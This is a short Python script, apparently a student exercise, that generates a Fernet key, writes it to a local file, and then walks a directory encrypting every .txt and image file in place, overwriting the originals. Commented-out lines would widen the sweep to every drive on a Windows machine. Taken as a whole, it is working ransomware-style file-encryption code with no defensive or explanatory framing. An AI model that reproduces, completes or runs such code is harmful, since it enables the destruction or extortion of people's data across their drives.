# working
import os
import win32api
from cryptography import fernet
# key generation
key = fernet.Fernet.generate_key()
fer = fernet.Fernet(key)
# writing the key into file to decrypt files
os.chdir("D:\BE\SEM 3\Python_indi")
with open('key.key','wb') as f1:
    f1.write(key)
# drives = win32api.GetLogicalDriveStrings()
# drives = drives.split('\000')[:-1]
# for k in drives:
for i in os.walk("D:\BE\SEM 3\Python_indi"):
    for j in i[2]:
        if j.endswith('.txt'):
            file_path = os.path.join(i[0], j)
            s = ""
            try:
                with open(file_path, 'r') as f:
                    s = f.read()
                s = s.encode("ascii")
                s = fer.encrypt(s)
                with open(file_path,'wb') as f1:
                    f1.write(s)
                print(f'{j}.txt encrypted')
            except Exception as e:
                print(f"Error reading {file_path}: {e}")
        if j.endswith('.png') or j.endswith('.jpg') or j.endswith('.gif') or j.endswith('.jpeg'):
            print(j)
            file_path = os.path.join(i[0], j)
            s = ""
            try:
                with open(file_path, 'rb') as f:
                    s = f.read()
                s = fer.encrypt(s)
                with open(file_path,'wb') as f1:
                    f1.write(s)
                print(f'{j}. img encrypted')
            except Exception as e:
                print(f"Error reading {file_path}: {e}")